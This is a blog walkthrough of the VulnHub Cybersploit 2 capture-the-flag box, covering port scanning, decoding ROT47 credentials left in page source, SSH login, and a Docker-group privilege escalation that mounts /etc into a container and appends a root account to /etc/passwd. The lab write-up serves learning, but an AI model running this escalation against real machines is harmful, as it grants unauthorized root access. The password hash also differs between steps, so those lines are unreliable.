+++ 
draft = false
date = 2020-07-24T17:38:12+01:00
title = "Cybersploit 2 CTF walkthrough"
description = "A walkthrough of the VulnHub CTF cybersploit 2"
slug = "" 
tags = []
categories = []
externalLink = ""
series = []
+++

[Cybersploit 2](https://www.vulnhub.com/entry/cybersploit-2,511/) is a fun boot2root on VulnHub. It's quite an enjoyable box, and whilst user is really rather easy, getting root is quite an interesting affair (at least I found it to be).

# Initial foothold
Let's scan the box and see what ports are open with `nmap -sC -sV -p- 192.168.123.131`:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-24 19:54 BST
Nmap scan report for 192.168.123.131
Host is up (0.0013s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 ad:6d:15:e7:44:e9:7b:b8:59:09:19:5c:bd:d6:6b:10 (RSA)
|   256 d6:d5:b4:5d:8d:f9:5e:6f:3a:31:ad:81:80:34:9b:12 (ECDSA)
|_  256 69:79:4f:8c:90:e9:43:6c:17:f7:31:e8:ff:87:05:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: CyberSploit2
MAC Address: 00:0C:29:22:79:4F (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds
```
So we know we have a web server of sorts, and SSH for when we'll most likely get credentials. A quick search for OpenSSH 8.0 doesn't reveal anything particularly interesting, and this isn't the case with Apache either.

Here's port 80:

![Website screenshot](/img/cybersploit2/webserver.png)

Of particular interest was the source code, specifically `<!----------ROT47---------->  `. Let's see if that comes in use later...

```
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
<!----------ROT47---------->
</body>
</html>
```

Of course I'm left wondering why on earth there was a list of usernames and passwords, and why the table haedings were messed up. But taking heed of our little comment, let's [decode the rot47-looking text](https://www.browserling.com/tools/rot47):
* Username: shailendra
* Password: cybersploit1

Naturally these credentials lend themselves well to SSH (`ssh shailendra@192.168.123.131`), as it all seems rather furtoutous.
```
The authenticity of host '192.168.123.131 (192.168.123.131)' can't be established.
ECDSA key fingerprint is SHA256:uGYzWYklxeL1iDjLGh5cLrkGjTgqAJfxn3mkDaZ7C7M.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.123.131' (ECDSA) to the list of known hosts.
shailendra@192.168.123.131's password: 
Last login: Wed Jul 15 12:32:09 2020
[shailendra@localhost ~]$ id
uid=1001(shailendra) gid=1001(shailendra) groups=1001(shailendra),991(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

I'm not sure if I took a slight shortcut, but I have user and I don't see why we shouldn't use it. Running `dirb` on the site doesn't reveal any new directories really either.

# Getting root
First things first, let's see if we have sudo access:

```
[shailendra@localhost ~]$ sudo -l
[sudo] password for shailendra: 
Sorry, user shailendra may not run sudo on localhost.
[shailendra@localhost ~]$
```

A quick `uname -a` tells us we're on Linux 4.18. Whilst we certainly could exploit something, looking at hint.txt suggests there's more to the puzzle:

```
[shailendra@localhost ~]$ cat hint.txt
docker
```

Sure enough, `ps -aux | grep docker` confirms this. As it turns out, as long as we're in the docker group, we can basically look at any file we want by mounting stuff as volumes. Better yet, we can write to those files too! Now we can simply create our own priviledged user, add him to the passwd file.

```
[shailendra@localhost ~]$ openssl passwd -1 -salt bob
Password: 
$1$bob$b0O6CwHOcDlU/.Qo9HwnN/

[shailendra@localhost ~]$ docker run -v /etc/:/mnt -it alpine
/ # echo 'bob:$1$bob$IK8bdtW2k5Au4RL.2IcEt0:0:0::/root:/bin/bash' >> /mnt/passwd
/ # tail /mnt/passwd
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd:x:998:996:User for polkitd:/:/sbin/nologin
unbound:x:997:995:Unbound DNS resolver:/etc/unbound:/sbin/nologin
sssd:x:996:993:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rngd:x:995:992:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
centos:x:1000:1000:CentOs:/home/centos:/bin/bash
shailendra:x:1001:1001::/home/shailendra:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
bob:$1$bob$b0O6CwHOcDlU/.Qo9HwnN/:0:0::/root:/bin/bash
/ # exit

```

All that's left to do is login and claim victory.

```
[shailendra@localhost ~]$ su - bob
Password: 
Last login: Sat Jul 25 03:53:42 IST 2020 on pts/0
[root@localhost ~]# whoami
root
[root@localhost ~]# cat flag.txt
 __    ___   _      __    ___    __   _____  __  
/ /`  / / \ | |\ | / /`_ | |_)  / /\   | |  ( (` 
\_\_, \_\_/ |_| \| \_\_/ |_| \ /_/--\  |_|  _)_) 

 Pwned CyberSploit2 POC

share it with me twitter@cybersploit1

              Thanks ! 

```

Overall quite an enjoyable CTF. Although it was quite quick and had little depth it was still a
fun learning experience, and I hope you learnt a bit about Docker privilege escalation  along the
way :)